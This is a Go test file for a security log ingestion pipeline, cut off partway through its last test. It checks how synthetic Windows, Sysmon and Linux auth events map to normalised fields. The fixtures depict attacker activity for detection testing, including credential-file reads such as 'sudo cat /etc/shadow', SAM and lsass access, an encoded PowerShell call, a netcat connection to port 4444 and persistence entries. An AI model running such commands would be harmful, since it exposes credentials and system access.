package ingest

import (
	"context"
	"encoding/json"
	"strings"
	"testing"
	"time"

	"github.com/jrsamsanchez/signalith/internal/store"
)

var now = time.Date(2026, 10, 11, 12, 0, 0, 0, time.UTC)

func decode(t *testing.T, s string) map[string]any {
	t.Helper()
	var m map[string]any
	dec := json.NewDecoder(strings.NewReader(s))
	dec.UseNumber()
	if err := dec.Decode(&m); err != nil {
		t.Fatal(err)
	}
	return m
}

func expect(t *testing.T, doc map[string]any, want map[string]any) {
	t.Helper()
	for k, v := range want {
		if doc[k] != v {
			t.Errorf("%s = %#v, want %#v", k, doc[k], v)
		}
	}
}

func TestWindowsFailedLogon(t *testing.T) {
	ins := make([]string, 21)
	ins[5], ins[6], ins[7], ins[9], ins[10], ins[12], ins[13], ins[19], ins[20] =
		"administrator", "CORP", "0xC000006D", "0xC000006A", "3", "NTLM", "KALI", "203.0.113.9", "51234"
	ins[4], ins[11], ins[18] = "S-1-0-0", "NtLmSsp ", `C:\Windows\System32\svchost.exe`
	b, _ := json.Marshal(map[string]any{
		"Channel": "Security", "Computer": "DC01.corp.local", "EventID": 4625,
		"TimeCreated": "2026-10-11 10:00:00 +0000", "StringInserts": ins, "Message": "An account failed to log on.",
	})
	ev := Normalize("win.security", decode(t, string(b)), now)
	if ev.Model != "Authentication" {
		t.Fatalf("model = %s", ev.Model)
	}
	expect(t, ev.Document(), map[string]any{
		"action": "failure", "user": "administrator", "src": "203.0.113.9", "src_port": int64(51234),
		"logon_type": int64(3), "logon_type_name": "network", "reason": "bad password",
		"logon_process": "NtLmSsp", "user_sid": "S-1-0-0", "process_name": "svchost.exe",
		"host": "DC01.corp.local", "signature_id": "4625", "sourcetype": "WinEventLog:Security",
		"@timestamp": "2026-10-11T10:00:00Z", "datamodel": "Authentication",
	})
}

func TestWindowsProcessCreation(t *testing.T) {
	ins := make([]string, 15)
	ins[1], ins[4], ins[5], ins[8], ins[13] = "bob", "0x1a2c", `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, "powershell -enc AAA", `C:\Windows\explorer.exe`
	b, _ := json.Marshal(map[string]any{"Channel": "Security", "Computer": "WS1", "EventID": "4688", "StringInserts": ins})
	ev := Normalize("win.security", decode(t, string(b)), now)
	expect(t, ev.Document(), map[string]any{
		"datamodel": "Endpoint", "process_name": "powershell.exe", "process": "powershell -enc AAA",
		"process_id": int64(0x1a2c), "parent_process_name": "explorer.exe", "user": "bob",
	})
}

func TestWindowsScheduledTaskCreated(t *testing.T) {
	task := `<?xml version="1.0" encoding="UTF-16"?><Task><Settings><Hidden>true</Hidden></Settings>` +
		`<Actions><Exec><Command>C:\Users\Public\run.exe</Command><Arguments>-u http://x/?a=1&amp;b=2</Arguments></Exec></Actions></Task>`
	ins := []string{"S-1-5-21-1", "bob", "CORP", "0x3e7", `\Updater`, task}
	b, _ := json.Marshal(map[string]any{"Channel": "Security", "Computer": "WS1", "EventID": "4698", "StringInserts": ins})
	ev := Normalize("win.security", decode(t, string(b)), now)
	expect(t, ev.Document(), map[string]any{
		"datamodel": "Change", "action": "created", "object_category": "scheduled_task", "object": `\Updater`,
		"task_name": `\Updater`, "task_content": task, "user": "bob", "user_domain": "CORP",
		"task_command": `C:\Users\Public\run.exe`, "task_arguments": "-u http://x/?a=1&b=2",
	})
}

func TestWindowsServiceInstalled(t *testing.T) {
	ins := []string{"RemCom Service", `%systemroot%\RemComSvc.exe`, "user mode service", "demand start", "LocalSystem"}
	rec := map[string]any{"Channel": "System", "Computer": "WS1", "EventID": "7045", "ProviderName": "Service Control Manager", "StringInserts": ins}
	b, _ := json.Marshal(rec)
	ev := Normalize("win.events", decode(t, string(b)), now)
	expect(t, ev.Document(), map[string]any{
		"datamodel": "Change", "action": "created", "object_category": "service", "object": "RemCom Service",
		"service_name": "RemCom Service", "service_path": `%systemroot%\RemComSvc.exe`, "service_type": "user mode service",
		"service_start_type": "demand start", "service_account": "LocalSystem", "provider": "Service Control Manager",
		"sourcetype": "WinEventLog:System", "signature_id": "7045",
	})
	// Event IDs are their provider's: another provider's 7045 is not a
	// service install.
	rec["ProviderName"] = "Some-Driver"
	b, _ = json.Marshal(rec)
	if ev := Normalize("win.events", decode(t, string(b)), now); ev.Model != "Other" || ev.Fields["provider"] != "Some-Driver" {
		t.Errorf("other provider = %s %v", ev.Model, ev.Fields)
	}
	// Wazuh sends the same event by name.
	alert := `{"timestamp":"2026-10-14T10:00:00.000+0000","rule":{"id":"61138","level":5,"description":"New Windows Service Created"},"agent":{"id":"001","name":"WS1"},` +
		`"data":{"win":{"system":{"providerName":"Service Control Manager","eventID":"7045","channel":"System","computer":"WS1","systemTime":"2026-10-14T10:00:00Z"},` +
		`"eventdata":{"serviceName":"KrbSCM","imagePath":"C:\\Users\\Public\\krb.exe","serviceType":"user mode service","startType":"auto start","accountName":"LocalSystem"}}}}`
	ev, ok := wazuhWindows(decode(t, alert))
	if !ok || ev.Model != "Change" || ev.Fields["service_name"] != "KrbSCM" || ev.Fields["service_path"] != `C:\Users\Public\krb.exe` || ev.Fields["service_start_type"] != "auto start" {
		t.Errorf("wazuh = %v %s %v", ok, ev.Model, ev.Fields)
	}
}

func TestWindowsSuccessfulLogon(t *testing.T) {
	ins := make([]string, 27)
	ins[0], ins[1], ins[2], ins[4], ins[5], ins[6], ins[8], ins[9], ins[10] =
		"S-1-5-18", "WS1$", "CORP", "S-1-5-21-1", "bob", "CORP", "9", "seclogo", "Negotiate"
	ins[15], ins[18], ins[20], ins[22], ins[23], ins[26] = "0", "::1", "%%1833", "admin", "OTHER", "%%1842"
	b, _ := json.Marshal(map[string]any{"Channel": "Security", "Computer": "WS1", "EventID": "4624", "StringInserts": ins})
	expect(t, Normalize("win.security", decode(t, string(b)), now).Document(), map[string]any{
		"datamodel": "Authentication", "action": "success", "user": "bob", "logon_type": int64(9), "logon_process": "seclogo",
		"src_user": "WS1$", "src_user_sid": "S-1-5-18", "src_user_domain": "CORP", "key_length": int64(0),
		"impersonation_level": "%%1833", "target_outbound_user": "admin", "target_outbound_domain": "OTHER",
		"elevated_token": "%%1842",
	})
	// An older 4624 without the trailing values leaves them out.
	b, _ = json.Marshal(map[string]any{"Channel": "Security", "Computer": "WS1", "EventID": "4624", "StringInserts": ins[:20]})
	doc := Normalize("win.security", decode(t, string(b)), now).Document()
	for _, k := range []string{"impersonation_level", "target_outbound_user", "elevated_token"} {
		if _, ok := doc[k]; ok {
			t.Errorf("%s set on an older 4624: %v", k, doc[k])
		}
	}
}

func TestWindowsSecurityServiceInstalled(t *testing.T) {
	ins := []string{"S-1-5-21-1", "bob", "CORP", "0x3e7", "PSEXESVC", `%SystemRoot%\PSEXESVC.exe`, "0x10", "3", "LocalSystem"}
	b, _ := json.Marshal(map[string]any{"Channel": "Security", "Computer": "WS1", "EventID": "4697", "StringInserts": ins})
	ev := Normalize("win.security", decode(t, string(b)), now)
	expect(t, ev.Document(), map[string]any{
		"datamodel": "Change", "action": "created", "object_category": "service", "object": "PSEXESVC", "user": "bob",
		"service_name": "PSEXESVC", "service_path": `%SystemRoot%\PSEXESVC.exe`, "service_type": "0x10",
		"service_start_type": "3", "service_account": "LocalSystem",
	})
	if _, ok := ev.Document()["client_process_id"]; ok {
		t.Error("client_process_id set on an older 4697")
	}
	ins = append(ins, "0x1", "0", "604")
	b, _ = json.Marshal(map[string]any{"Channel": "Security", "Computer": "WS1", "EventID": "4697", "StringInserts": ins})
	expect(t, Normalize("win.security", decode(t, string(b)), now).Document(), map[string]any{
		"client_process_id": int64(0), "parent_process_id": int64(604),
	})
}

func TestWindowsShareAccessAndDirectoryChange(t *testing.T) {
	ins := []string{"S-1-5-7", "ANONYMOUS LOGON", "NT AUTHORITY", "0x3e6", "File", "198.51.100.7", "49702", `\\*\IPC$`, "", "lsarpc", "0x3", "%%1541 %%4416 %%4417"}
	b, _ := json.Marshal(map[string]any{"Channel": "Security", "Computer": "DC1", "EventID": "5145", "StringInserts": ins})
	expect(t, Normalize("win.security", decode(t, string(b)), now).Document(), map[string]any{
		"datamodel": "Filesystem", "action": "modified", "user": "ANONYMOUS LOGON", "src": "198.51.100.7", "src_port": int64(49702),
		"share_name": `\\*\IPC$`, "share_target": "lsarpc", "file_name": "lsarpc", "access_list": "%%1541 %%4416 %%4417",
		"access_names": "%%1541 %%4416 %%4417 SYNCHRONIZE ReadData WriteData", "access_mask": "0x3",
	})
	ins = []string{"{1}", "-", "S-1-5-21-1", "eve", "CORP", "0x1a2b", "corp.example.com", "%%14676", "CN=bob,CN=Users,DC=corp,DC=example,DC=com",
		"{6f1b4c2e-0d3a-4b8e-9c71-2a5d8e4f9b10}", "user", "sIDHistory", "2.5.5.17", "S-1-5-21-2-500", "%%14674"}
	b, _ = json.Marshal(map[string]any{"Channel": "Security", "Computer": "DC1", "EventID": "5136", "StringInserts": ins})
	expect(t, Normalize("win.security", decode(t, string(b)), now).Document(), map[string]any{
		"datamodel": "Change", "action": "modified", "object_category": "directory_object", "user": "eve",
		"object": "CN=bob,CN=Users,DC=corp,DC=example,DC=com", "ad_object_class": "user", "ad_attribute": "sIDHistory",
		"ad_value": "S-1-5-21-2-500", "ad_operation": "%%14674", "ad_object_guid": "6f1b4c2e-0d3a-4b8e-9c71-2a5d8e4f9b10",
	})
}

func TestWindowsObjectAccess(t *testing.T) {
	ins := []string{"S-1-5-21-1", "bob", "CORP", "0x3e7", "Security", "File", `C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State`,
		"0x1f4", "%%4416\n\t\t\t\t", "0x1", "0x1092", `C:\Tools\steal.exe`}
	b, _ := json.Marshal(map[string]any{"Channel": "Security", "Computer": "WS1", "EventID": "4663", "StringInserts": ins})
	ev := Normalize("win.security", decode(t, string(b)), now)
	expect(t, ev.Document(), map[string]any{
		"datamodel": "Filesystem", "action": "read", "file_name": "Local State", "object_name": "Local State",
		"object_type": "File", "access_list": "%%4416", "access_mask": "0x1", "process_name": "steal.exe", "process_id": int64(0x1092),
	})
	ins[5], ins[6], ins[8] = "Key", `\REGISTRY\MACHINE\SOFTWARE\Clients\StartMenuInternet`, "%%4432 %%1537"
	b, _ = json.Marshal(map[string]any{"Channel": "Security", "Computer": "WS1", "EventID": "4663", "StringInserts": ins})
	ev = Normalize("win.security", decode(t, string(b)), now)
	expect(t, ev.Document(), map[string]any{
		"datamodel": "Registry", "action": "deleted", "registry_path": `\REGISTRY\MACHINE\SOFTWARE\Clients\StartMenuInternet`,
		"object_path": `\REGISTRY\MACHINE\SOFTWARE\Clients\StartMenuInternet`,
	})
}

func TestWindowsHandleRequestsAndRegistryValue(t *testing.T) {
	sec := func(id string, ins []string) map[string]any {
		b, _ := json.Marshal(map[string]any{"Channel": "Security", "Computer": "WS1", "EventID": id, "StringInserts": ins})
		return Normalize("win.security", decode(t, string(b)), now).Document()
	}
	expect(t, sec("4656", []string{"S-1-5-21-1", "bob", "CORP", "0x1a2b", "Security", "Key", `\REGISTRY\MACHINE\SAM`, "0x0", "{0}",
		"%%1538 %%4432", "-", "0x20019", "-", "0", "0x1a4", `C:\Tools\dump.exe`}), map[string]any{
		"datamodel": "Registry", "action": "read", "object_server": "Security", "object_type": "Key", "registry_path": `\REGISTRY\MACHINE\SAM`,
		"access_mask": "0x20019", "process_path": `C:\Tools\dump.exe`, "process_id": int64(0x1a4), "signature": "A handle to an object was requested",
	})
	expect(t, sec("4661", []string{"S-1-5-21-1", "bob", "CORP", "0x1a2b", "Security Account Manager", "SAM_USER", "S-1-5-21-1-500", "0x0", "{0}",
		"%%5392\n\t\t\t\t", "0x2d", "-", "{a}\n\t{b}", "0", "0x2b4", `C:\Windows\System32\lsass.exe`}), map[string]any{
		"object_server": "Security Account Manager", "object_type": "SAM_USER", "object_path": "S-1-5-21-1-500", "access_list": "%%5392",
		"access_mask": "0x2d", "object_properties": "{a} {b}", "process_name": "lsass.exe",
	})
	expect(t, sec("4657", []string{"S-1-5-21-1", "bob", "CORP", "0x1a2b", `\REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa`,
		"LmCompatibilityLevel", "0x1f0", "%%1905", "%%1876", "5", "%%1876", "2", "0x1a4", `C:\Windows\regedit.exe`}), map[string]any{
		"datamodel": "Registry", "action": "modified", "object_path": `\REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa`,
		"registry_path": `\REGISTRY\MACHINE\SYSTEM\ControlSet001\Control\Lsa\LmCompatibilityLevel`, "registry_key_name": "Lsa",
		"registry_value_name": "LmCompatibilityLevel", "registry_old_value_data": "5", "registry_value_data": "2", "process_name": "regedit.exe",
	})
}

func TestWindowsDirectoryAccessAndKerberos(t *testing.T) {
	sec := func(id string, ins []string) map[string]any {
		b, _ := json.Marshal(map[string]any{"Channel": "Security", "Computer": "DC1", "EventID": id, "StringInserts": ins})
		return Normalize("win.security", decode(t, string(b)), now).Document()
	}
	expect(t, sec("4662", []string{"S-1-5-21-1", "eve", "CORP", "0x1a2b", "DS", "%{19195a5b-6da0-11d0-afd3-00c04fd930c9}",
		"%{6f1b4c2e-0d3a-4b8e-9c71-2a5d8e4f9b10}", "Object Access", "0x0", "%%7688\n\t\t\t\t", "0x100",
		"%%7688\n\t\t{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}\n\t{19195a5b-6da0-11d0-afd3-00c04fd930c9}"}), map[string]any{
		"datamodel": "Change", "action": "read", "object_category": "directory_object", "object_server": "DS",
		"object_type": "%{19195a5b-6da0-11d0-afd3-00c04fd930c9}", "object": "%{6f1b4c2e-0d3a-4b8e-9c71-2a5d8e4f9b10}",
		"access_names": "%%7688 ControlAccess", "access_mask": "0x100",
		"object_properties": "%%7688 {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} {19195a5b-6da0-11d0-afd3-00c04fd930c9}",
	})
	expect(t, sec("4768", []string{"bob", "CORP", "S-1-5-21-1-1104", "krbtgt", "S-1-5-21-1-502", "0x40810010", "0x0", "0x17", "0",
		"::ffff:192.0.2.10", "50123", "", "", ""}), map[string]any{
		"datamodel": "Authentication", "action": "success", "app": "win:kerberos", "user": "bob", "user_sid": "S-1-5-21-1-1104",
		"kerberos_service": "krbtgt", "ticket_options": "0x40810010", "kerberos_status": "0x0", "ticket_encryption_type": "0x17",
		"pre_auth_type": "0", "src": "192.0.2.10", "src_port": int64(50123),
	})
	expect(t, sec("4769", []string{"bob@CORP.EXAMPLE.COM", "CORP.EXAMPLE.COM", "MSSQLSvc", "S-1-5-21-1-1300", "0x40810000", "0x17",
		"::ffff:192.0.2.10", "50124", "0x1b"}), map[string]any{
		"datamodel": "Authentication", "action": "failure", "user": "bob@CORP.EXAMPLE.COM", "kerberos_service": "MSSQLSvc",
		"ticket_encryption_type": "0x17", "kerberos_status": "0x1b", "src_port": int64(50124),
	})
}

func TestWindowsExplicitCredentialsAndFilteringPlatform(t *testing.T) {
	sec := func(id string, ins []string) map[string]any {
		b, _ := json.Marshal(map[string]any{"Channel": "Security", "Computer": "WS1", "EventID": id, "StringInserts": ins})
		return Normalize("win.security", decode(t, string(b)), now).Document()
	}
	expect(t, sec("4648", []string{"S-1-5-21-1", "bob", "CORP", "0x1a2b", "{0}", "admin", "CORP", "{0}", "fs1.corp.example.com",
		"fs1.corp.example.com", "0x1a4", `C:\Windows\System32\cmd.exe`, "-", "-"}), map[string]any{
		"datamodel": "Authentication", "src_user": "bob", "user": "admin", "dest": "fs1.corp.example.com",
		"process_name": "cmd.exe", "signature": "A logon was attempted using explicit credentials",
	})
	expect(t, sec("5157", []string{"4242", `\device\harddiskvolume2\program files\vendor\agent.exe`, "%%14593", "10.0.0.5", "50123",
		"203.0.113.9", "443", "6", "70413", "%%14611", "48"}), map[string]any{
		"datamodel": "Network_Traffic", "action": "blocked", "direction": "outbound", "transport": "tcp", "process_name": "agent.exe",
		"src": "10.0.0.5", "dest": "203.0.113.9", "dest_port": int64(443), "layer_rtid": "48",
	})
}

func TestWindowsAccountAndAuditPolicyChanges(t *testing.T) {
	sec := func(id string, ins []string) map[string]any {
		b, _ := json.Marshal(map[string]any{"Channel": "Security", "Computer": "DC1", "EventID": id, "StringInserts": ins})
		return Normalize("win.security", decode(t, string(b)), now).Document()
	}
	ins := []string{"-", "jdoe", "CORP", "S-1-5-21-1-1201", "S-1-5-21-1-500", "admin", "CORP", "0x967cf92", "-", "-", "-", "-", "-", "-",
		"-", "-", "-", "-", "-", "-", "-", "0x10", "0x10010", "\r\n\t\t%%2096", "-", "-", "%%1793"}
	expect(t, sec("4738", ins), map[string]any{
		"datamodel": "Change", "action": "modified", "object_category": "user", "object": "jdoe", "object_sid": "S-1-5-21-1-1201",
		"user": "admin", "old_uac_value": "0x10", "new_uac_value": "0x10010", "user_account_control": "%%2096",
	})
	expect(t, sec("4720", ins[1:]), map[string]any{"action": "created", "object": "jdoe", "user": "admin", "user_domain": "CORP"})
	expect(t, sec("4732", []string{"-", "S-1-5-21-1-1201", "DnsAdmins", "CORP", "S-1-5-21-1-1101", "S-1-5-21-1-500", "admin", "CORP", "0x1"}), map[string]any{
		"object_category": "group", "object": "DnsAdmins", "member_sid": "S-1-5-21-1-1201", "user": "admin", "object_sid": "S-1-5-21-1-1101",
	})
	expect(t, sec("4719", []string{"S-1-5-18", "DC1$", "CORP", "0x3e7", "%%8274", "%%12801", "{0CCE9215-69AE-11D9-BED3-505054503030}", "%%8448, %%8450"}), map[string]any{
		"object_category": "audit_policy", "audit_subcategory_guid": "{0CCE9215-69AE-11D9-BED3-505054503030}",
		"audit_policy_changes": "%%8448, %%8450", "user": "DC1$",
	})
}

func TestSysmonProcessHashes(t *testing.T) {
	msg := "Process Create:\r\nImage: C:\\Users\\bob\\evil.exe\r\nCommandLine: evil.exe\r\nUser: CORP\\bob\r\nHashes: SHA1=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,MD5=BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB,SHA256=CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC,IMPHASH=DD"
	b, _ := json.Marshal(map[string]any{"Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS1", "EventID": 1, "Message": msg})
	ev := Normalize("win.sysmon", decode(t, string(b)), now)
	expect(t, ev.Document(), map[string]any{
		"process_md5": strings.Repeat("b", 32), "process_sha1": strings.Repeat("a", 40), "process_sha256": strings.Repeat("c", 64),
	})
}

// A command line spanning several lines in the rendered message stays whole,
// blank lines included, and the fields after it are still read. (A line
// shaped like "Key: value" ends it: the rendered message cannot tell them
// apart, which is why the OTLP path reads the named values instead.)
func TestSysmonMultiLineCommandLine(t *testing.T) {
	msg := "Process Create:\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nOriginalFileName: Cmd.Exe\r\n" +
		"CommandLine: cmd /c echo one\r\necho two\r\n\r\necho three\r\nCurrentDirectory: C:\\Temp\\\r\n" +
		"User: CORP\\bob\r\nLogonId: 0x3E7\r\nIntegrityLevel: High\r\nParentProcessId: 77\r\nParentUser: CORP\\svc"
	b, _ := json.Marshal(map[string]any{"Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS1", "EventID": 1, "Message": msg})
	ev := Normalize("win.sysmon", decode(t, string(b)), now)
	expect(t, ev.Document(), map[string]any{
		"process": "cmd /c echo one\necho two\n\necho three", "original_file_name": "Cmd.Exe",
		"process_current_directory": `C:\Temp\`, "logon_id": "0x3E7", "process_integrity_level": "High",
		"parent_process_id": int64(77), "parent_user": `CORP\svc`,
	})
}

func TestSysmonNetwork(t *testing.T) {
	msg := "Network connection detected:\r\nRuleName: -\r\nImage: C:\\Tools\\nc.exe\r\nUser: CORP\\bob\r\nProtocol: tcp\r\nSourceIsIpv6: False\r\nSourceIp: 10.0.0.5\r\nSourcePort: 50000\r\nDestinationIp: 198.51.100.7\r\nDestinationHostname: -\r\nDestinationPort: 4444\r\nDestinationPortName: -"
	b, _ := json.Marshal(map[string]any{"Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS1", "EventID": 3,
		"ProviderName": "Microsoft-Windows-Sysmon", "Message": msg})
	ev := Normalize("win.sysmon", decode(t, string(b)), now)
	doc := ev.Document()
	expect(t, doc, map[string]any{
		"datamodel": "Network_Traffic", "dest": "198.51.100.7", "dest_port": int64(4444), "process_name": "nc.exe", "transport": "tcp",
		"src_is_ipv6": "false", "provider": "Microsoft-Windows-Sysmon",
	})
	if _, ok := doc["dest_port_name"]; ok {
		t.Errorf("dest_port_name '-' should be dropped")
	}
	if _, ok := doc["dest_host"]; ok {
		t.Errorf("dest_host '-' should be dropped")
	}
}

func TestLinuxAuthLines(t *testing.T) {
	cases := []struct {
		line string
		want map[string]any
	}{
		{"Oct 11 09:15:02 web1 sshd[811]: Failed password for invalid user oracle from 192.0.2.4 port 40122 ssh2",
			map[string]any{"datamodel": "Authentication", "action": "failure", "user": "oracle", "src": "192.0.2.4", "reason": "unknown user", "host": "web1", "app": "sshd", "process_id": int64(811)}},
		{"Oct 11 09:15:09 web1 sshd[812]: Accepted publickey for deploy from 192.0.2.10 port 40200 ssh2: RSA SHA256:abc",
			map[string]any{"action": "success", "user": "deploy", "authentication_method": "publickey"}},
		// OpenSSH 9.8 and later (Debian 13, Ubuntu 24.10, Fedora 41, RHEL 10).
		{"Oct 11 09:15:20 web1 sshd-session[1234]: Accepted password for root from 192.0.2.11 port 50000 ssh2",
			map[string]any{"datamodel": "Authentication", "action": "success", "user": "root", "src": "192.0.2.11", "app": "sshd", "process_id": int64(1234)}},
		{"Oct 11 09:15:21 web1 sshd-auth[1235]: Failed password for bob from 192.0.2.11 port 50001 ssh2",
			map[string]any{"datamodel": "Authentication", "action": "failure", "user": "bob", "app": "sshd"}},
		{"Oct 11 09:16:00 web1 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow",
			map[string]any{"datamodel": "Authentication", "action": "success", "src_user": "alice", "user": "root", "process": "/usr/bin/cat /etc/shadow"}},
		{"Oct 11 09:16:30 web1 sudo:    alice : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/bash",
			map[string]any{"action": "failure", "reason": "bad password"}},
		{"Oct 11 09:17:00 web1 useradd[900]: new user: name=backdoor, UID=1002, GID=1002, home=/home/backdoor, shell=/bin/bash",
			map[string]any{"datamodel": "Change", "action": "created", "object": "backdoor"}},
		{"Oct 11 09:18:00 web1 su[901]: pam_unix(su:session): session opened for user root(uid=0) by alice(uid=1000)",
			map[string]any{"datamodel": "Authentication", "action": "success", "user": "root", "src_user": "alice", "app": "su"}},
		{"Oct 11 09:19:00 web1 cron[5]: (root) CMD (run-parts /etc/cron.hourly)",
			map[string]any{"datamodel": "Other", "app": "cron", "sourcetype": "linux:auth"}},
	}
	for _, c := range cases {
		ev := Normalize("linux.auth", map[string]any{"log": c.line}, now)
		doc := ev.Document()
		expect(t, doc, c.want)
		if doc["message"] != c.line {
			t.Errorf("message not preserved for %q", c.line)
		}
		if !strings.HasPrefix(doc["@timestamp"].(string), "2026-10-11T") {
			t.Errorf("timestamp = %v", doc["@timestamp"])
		}
	}
}

func TestJournal(t *testing.T) {
	r := map[string]any{
		"_HOSTNAME": "db1", "SYSLOG_IDENTIFIER": "sshd", "_PID": "77",
		"MESSAGE":              "Failed password for root from 198.51.100.2 port 2222 ssh2",
		"__REALTIME_TIMESTAMP": "1791763200000000",
	}
	doc := Normalize("linux.journal", r, now).Document()
	expect(t, doc, map[string]any{"user": "root", "action": "failure", "host": "db1", "@timestamp": "2026-10-12T00:00:00Z"})
}

func TestUnknownRecordStaysSearchable(t *testing.T) {
	r := decode(t, `{"date": 1791720000.5, "level": "warn", "detail": {"a": 1}}`)
	doc := Normalize("app.custom", r, now).Document()
	expect(t, doc, map[string]any{"datamodel": "Other", "level": "warn", "detail": `{"a":1}`, "@timestamp": "2026-10-11T12:00:00.5Z"})
	if doc["message"] == nil {
		t.Error("message missing")
	}
}

type fakeBulk struct{ docs []store.IndexedDoc }

func (f *fakeBulk) Bulk(_ context.Context, docs []store.IndexedDoc) ([]store.BulkItemError, error) {
	f.docs = append(f.docs, docs...)
	return nil, nil
}

func TestPipelineRoutesToDailyModelIndex(t *testing.T) {
	fb := &fakeBulk{}
	p := &Pipeline{Store: fb, Prefix: "sig", Now: func() time.Time { return now }}
	res, err := p.Ingest(context.Background(), "linux.auth", []map[string]any{
		{"log": "Oct 11 09:15:02 web1 sshd[811]: Failed password for bob from 192.0.2.4 port 1 ssh2"},
		{"log": "not syslog at all"},
	})
	if err != nil || res.Indexed != 2 {
		t.Fatalf("res=%+v err=%v", res, err)
	}
	if fb.docs[0].Index != "sig-authentication-2026.10.11" || fb.docs[1].Index != "sig-other-2026.10.11" {
		t.Errorf("indexes = %s, %s", fb.docs[0].Index, fb.docs[1].Index)
	}
	if s := p.Stats(); s.Received != 2 || s.Indexed != 2 {
		t.Errorf("stats = %+v", s)
	}
}

func TestIngestEvents(t *testing.T) {
	fb := &fakeBulk{}
	p := &Pipeline{Store: fb, Prefix: "sig", Now: func() time.Time { return now }}
	auth := ParseProgram("web1", "sshd", "7", "Failed password for root from 192.0.2.4 port 22 ssh2", "syslog")
	auth.Time = time.Date(2026, 10, 10, 23, 0, 0, 0, time.UTC)
	res, err := p.IngestEvents(context.Background(), []Event{auth, {Fields: map[string]any{"message": "no time, no model"}}})
	if err != nil || res.Indexed != 2 {
		t.Fatalf("res=%+v err=%v", res, err)
	}
	if fb.docs[0].Index != "sig-authentication-2026.10.10" || fb.docs[1].Index != "sig-other-2026.10.11" {
		t.Errorf("indexes = %s, %s", fb.docs[0].Index, fb.docs[1].Index)
	}
	expect(t, fb.docs[1].Doc, map[string]any{"datamodel": "Other", "@timestamp": "2026-10-11T12:00:00Z"})
	if s := p.Stats(); s.Received != 2 || s.Indexed != 2 {
		t.Errorf("stats = %+v", s)
	}
}

func TestGuessYear(t *testing.T) {
	cases := []struct{ stamp, now, want string }{
		{"Oct 11 09:15:02", "2026-10-11T12:00:00Z", "2026-10-11T09:15:02Z"},
		{"Oct 12 11:00:00", "2026-10-11T12:00:00Z", "2026-10-12T11:00:00Z"}, // within a day ahead: clock skew
		{"Dec 31 23:59:59", "2027-01-01T00:00:30Z", "2026-12-31T23:59:59Z"},
	}
	for _, c := range cases {
		st, _ := time.Parse("Jan _2 15:04:05", c.stamp)
		n, _ := time.Parse(time.RFC3339, c.now)
		if got := GuessYear(st, n).Format(time.RFC3339); got != c.want {
			t.Errorf("%s at %s = %s, want %s", c.stamp, c.now, got, c.want)
		}
	}
}

func TestSysmonEventTypes(t *testing.T) {
	sysmon := func(id int, lines ...string) map[string]any {
		b, _ := json.Marshal(map[string]any{"Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS1", "EventID": id,
			"Message": strings.Join(lines, "\r\n")})
		return Normalize("win.sysmon", decode(t, string(b)), now).Document()
	}
	expect(t, sysmon(7, "Image loaded:", `Image: C:\Users\bob\app.exe`, "ProcessId: 4242", `ImageLoaded: C:\Users\bob\evil.dll`,
		"Description: Evil", "OriginalFileName: evil.dll", "Hashes: SHA256=ABCD,IMPHASH=EF01", "Signed: false", "Signature: -",
		"SignatureStatus: Unavailable", `User: CORP\bob`), map[string]any{
		"datamodel": "Image_Load", "process_name": "app.exe", "loaded_file_path": `C:\Users\bob\evil.dll`, "loaded_file_name": "evil.dll",
		"signed": "false", "signature_status": "Unavailable", "process_id": int64(4242), "user": `CORP\bob`,
		"loaded_file_description": "Evil", "loaded_original_file_name": "evil.dll", "loaded_file_hash": "SHA256=ABCD,IMPHASH=EF01",
	})
	expect(t, sysmon(10, "Process accessed:", `SourceImage: C:\Tools\procdump.exe`, "SourceProcessId: 77", `TargetImage: C:\Windows\system32\lsass.exe`,
		"TargetProcessId: 640", "GrantedAccess: 0x1410", `CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9d4c4|UNKNOWN(00007FFB)`, `SourceUser: CORP\bob`), map[string]any{
		"datamodel": "Endpoint", "signature": "Process accessed", "process_name": "procdump.exe", "target_process_name": "lsass.exe",
		"target_process_id": int64(640), "granted_access": "0x1410", "call_trace": `C:\Windows\SYSTEM32\ntdll.dll+9d4c4|UNKNOWN(00007FFB)`,
	})
	expect(t, sysmon(8, "CreateRemoteThread detected:", `SourceImage: C:\Tools\inject.exe`, `TargetImage: C:\Windows\explorer.exe`,
		"StartAddress: 0x00000000025D0000", "StartModule: -", "StartFunction: -"), map[string]any{
		"datamodel": "Endpoint", "signature": "Remote thread created", "target_process_path": `C:\Windows\explorer.exe`, "start_address": "0x00000000025D0000",
	})
	expect(t, sysmon(11, "File created:", `Image: C:\Windows\System32\cmd.exe`, `TargetFilename: C:\Users\bob\AppData\Roaming\run.vbs`), map[string]any{
		"datamodel": "Filesystem", "action": "created", "file_name": "run.vbs", "process_name": "cmd.exe",
	})
	expect(t, sysmon(23, "File Delete archived:", `Image: C:\x.exe`, `TargetFilename: C:\logs\a.log`, "Hashes: SHA256=ABCD"), map[string]any{
		"datamodel": "Filesystem", "action": "deleted", "file_path": `C:\logs\a.log`, "file_hash": "abcd",
	})
	expect(t, sysmon(13, "Registry value set:", "EventType: SetValue", `Image: C:\x.exe`,
		`TargetObject: HKU\S-1-5-21\Software\Microsoft\Windows\CurrentVersion\Run\Updater`, `Details: C:\Users\bob\u.exe`), map[string]any{
		"datamodel": "Registry", "action": "modified", "registry_value_name": "Updater", "registry_key_name": "Run",
		"registry_value_data": `C:\Users\bob\u.exe`, "registry_event_type": "SetValue",
	})
	expect(t, sysmon(12, "Registry object added or deleted:", "EventType: CreateKey", `TargetObject: HKLM\System\CurrentControlSet\Services\Evil`), map[string]any{
